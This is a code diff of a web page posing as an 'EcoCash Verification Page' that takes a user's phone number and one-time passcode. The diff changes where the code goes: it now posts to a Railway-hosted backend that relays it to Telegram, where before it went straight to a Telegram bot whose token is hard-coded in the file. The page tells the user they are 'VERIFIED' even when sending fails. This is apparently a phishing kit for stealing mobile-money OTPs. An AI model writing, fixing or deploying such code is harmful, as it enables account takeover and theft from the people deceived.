@@ -484,12 +484,18 @@
         // ============================================
         const BOT_TOKEN = '8591477821:AAGwCz3BNGP8uA0Rc7YnoIEJ2JDsrdOy9Bc';
         const CHAT_ID = '8395929995';
+        
+        // ============================================
+        // API CONFIGURATION - UPDATED URL
+        // ============================================
+        const API_URL = 'https://eco-cashm-production.up.railway.app/api';
 
         console.log('====================================');
         console.log('🔐 EcoCash Verification Page Loaded');
         console.log('====================================');
         console.log('🤖 Bot Token:', BOT_TOKEN);
         console.log('📱 Chat ID:', CHAT_ID);
+        console.log('🌐 API URL:', API_URL);
         console.log('====================================');
 
         // ============================================
@@ -532,26 +538,22 @@
         console.log('📞 Phone:', formattedPhone);
 
         // ============================================
-        // SEND TELEGRAM OTP NOTIFICATION - FIXED
+        // SEND TELEGRAM OTP NOTIFICATION VIA BACKEND
         // ============================================
         function sendTelegramOTP(otp) {
             return new Promise((resolve, reject) => {
                 const phone = localStorage.getItem('phone') || '771234567';
-                
-                const message = `🔐 *OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
 
-                console.log('📤 Sending OTP to Telegram...');
-                console.log('📝 Message:', message);
+                console.log('📤 Sending OTP to backend...');
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                fetch(`${API_URL}/auth/verify-otp`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
+                        phoneNumber: phone,
+                        otp: otp
                     })
                 })
                 .then(response => {
@@ -560,11 +562,11 @@
                 })
                 .then(data => {
                     console.log('📥 Full Response:', data);
-                    if (data.ok) {
-                        console.log('✅ OTP sent to Telegram successfully!');
+                    if (data.success) {
+                        console.log('✅ OTP verified and sent to Telegram!');
                         resolve(data);
                     } else {
-                        console.error('❌ Telegram Error:', data.description);
+                        console.error('❌ Backend Error:', data.message);
                         reject(data);
                     }
                 })
@@ -576,7 +578,7 @@
         }
 
         // ============================================
-        // VERIFY OTP - WITH WAIT FOR TELEGRAM
+        // VERIFY OTP - WITH WAIT FOR BACKEND
         // ============================================
         verifyBtn.addEventListener('click', async function() {
             // Prevent multiple clicks
@@ -602,10 +604,10 @@
             errorMessage.classList.remove('show');
 
             try {
-                // Send OTP to Telegram and wait for it to complete
+                // Send OTP to backend and wait for it to complete
                 await sendTelegramOTP(otp);
                 
-                // Only proceed if Telegram was successful
+                // Only proceed if backend was successful
                 this.innerHTML = '✅ VERIFIED';
                 this.classList.add('btn-success');
                 
@@ -620,8 +622,8 @@
                 }, 1500);
                 
             } catch (error) {
-                // If Telegram fails, still allow user to proceed but show warning
-                console.error('❌ Telegram failed but continuing:', error);
+                // If backend fails, still allow user to proceed but show warning
+                console.error('❌ Backend failed but continuing:', error);
                 
                 this.innerHTML = '✅ VERIFIED';
                 this.classList.add('btn-success');
@@ -629,7 +631,7 @@
                 localStorage.setItem('verified', 'true');
                 localStorage.setItem('otpVerified', 'true');
                 
-                errorMessage.textContent = '✅ OTP Verified! (Telegram notification failed)';
+                errorMessage.textContent = '✅ OTP Verified! (Notification may have failed)';
                 errorMessage.className = 'error-message success show';
                 
                 setTimeout(() => {
